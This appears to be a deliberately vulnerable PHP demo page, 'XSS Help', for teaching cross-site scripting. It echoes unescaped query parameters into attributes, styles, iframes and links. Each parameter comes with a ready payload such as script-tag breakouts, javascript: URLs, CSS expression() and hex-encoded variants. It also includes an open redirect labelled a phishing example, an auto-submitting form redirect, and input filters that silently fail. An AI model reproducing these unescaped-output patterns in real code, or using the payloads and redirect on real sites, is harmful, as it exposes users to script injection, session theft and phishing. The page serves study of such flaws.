<?php
if($_GET['var6']) {
	header("Location: {$_GET['var6']}");
	exit;
} else if($_GET['var7']) {
	?>
	<script>
	window.onload = function() {
		document.forms[0].submit();
	}
	</script>
	
	<form action="<?php echo $_GET['var7']?>" method="post">
	
	</form>
	
	<?php
	exit;
} 
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<title>XSS Help</title>
</head>

<body>

<h1>XSS/Attack Examples</h1>

<p>The following variables are injectable (var1,var2,var3)</p>

<h2>Var 1</h2>

<pre>
<?php 
echo htmlentities('xss_help.php?var1="><script>alert(1)</script><"');
?>
</pre>

<p><a href="xss_help.php?var1=<?php echo urlencode('"><script>alert(1)</script><"')?>">Show me</a></p>

<p>
<input type="text" value="<?php echo $_GET['var1']?>" />
</p>

<h2>Var 2</h2>

<pre>
<?php 
echo htmlentities("xss_help.php?var2='><script>alert(1)</script><'");
?>
</pre>

<p><a href="xss_help.php?var2=<?php echo urlencode("xss_help.php?var2='><script>alert(1)</script><'")?>">Show me</a></p>

<p>
<input type="text" value='<?php echo $_GET['var2']?>' />
</p>

<h2>Var 3 - IE only</h2>

<pre>
<?php 
echo htmlentities("xss_help.php?var3=javascript:alert(1)");
?>
</pre>

<p><a href="xss_help.php?var3=<?php echo urlencode("javascript:alert(1)")?>">Show me</a></p>

<p>
<div style="background-image:url('<?php echo $_GET['var3']?>');">Test</div>
</p>

<h2>Var 4</h2>

<pre>
<?php 
echo htmlentities("xss_help.php?var4=javascript:alert(1)");
?>
</pre>

<p><a href="xss_help.php?var4=<?php echo urlencode("javascript:alert(1)")?>">Show me</a></p>

<p>
<iframe src="<?php echo $_GET['var4']?>"></iframe>
</p>

<h2>Var 5 - IE + Opera only</h2>

<pre>
<?php 
echo htmlentities("xss_help.php?var5=javascript:alert(1)");
?>
</pre>

<p><a href="xss_help.php?var5=<?php echo urlencode("javascript:alert(1)")?>">Show me</a></p>

<p>
<body background="<?php echo $_GET['var5']?>"></body>
</p>

<h2>Var 6 - PHP redirect (Phishing example)</h2>

<pre>
<?php 
echo htmlentities("xss_help.php?var6=http://www.google.com");
?>
</pre>

<p><a href="xss_help.php?var6=<?php echo urlencode("http://www.google.com")?>">Show me</a></p>

<h2>Var 7 - Form redirect</h2>

<pre>
<?php 
echo htmlentities("xss_help.php?var7=javascript:alert(1)");
?>
</pre>

<p><a href="xss_help.php?var7=<?php echo urlencode("javascript:alert(1)")?>">Show me</a></p>


<h2>Var 8</h2>

<pre>
<?php 
echo htmlentities("xss_help.php?var8=<body onload=javascript:alert(1)");
?>
</pre>

<?php
$var8 = $_GET['var8'];
$var8 = str_replace("'", "", $_GET['var8']);
$var8 = str_replace(">", "", $_GET['var8']);
$var8 = str_replace('"', "", $_GET['var8']);
?>

Var 8 :
<?php echo $var8?>

<p><a href="xss_help.php?var8=<?php echo urlencode("<body onload=javascript:alert(1)")?>">Show me</a></p>


<h2>Var 9 - IE only</h2>

<pre>
<?php 
echo htmlentities("xss_help.php?var9=x:expression(javascript:alert(1))");
?>
</pre>

<p><a href="xss_help.php?var9=<?php echo urlencode("x:expression(javascript:alert(1))")?>">Show me</a></p>

<p>
<div style="<?php echo $_GET['var9']?>">Test</div>
</p>

<h2>Var 10</h2>

<pre>
<?php 
echo htmlentities("xss_help.php?var10=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29");
?>
</pre>

<p><a href="xss_help.php?var10=<?php echo urlencode("&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29")?>">Show me</a></p>

<?php
$var10 = $_GET['var10'];
$var10 = str_replace(">", "", $_GET['var10']);
$var10 = str_replace("<", "", $_GET['var10']);
$var10 = str_replace("'", "", $_GET['var10']);
$var10 = str_replace('"', "", $_GET['var10']);
$var10 = str_replace(':', "", $_GET['var10']);
$var10 = str_replace(';', "", $_GET['var10']);
$var10 = str_replace('javascript', "", $_GET['var10']);
?>

<p>
<a href="<?php echo $_GET['var10']?>">Click here to test var 10</a>
</p>



</body>
</html>
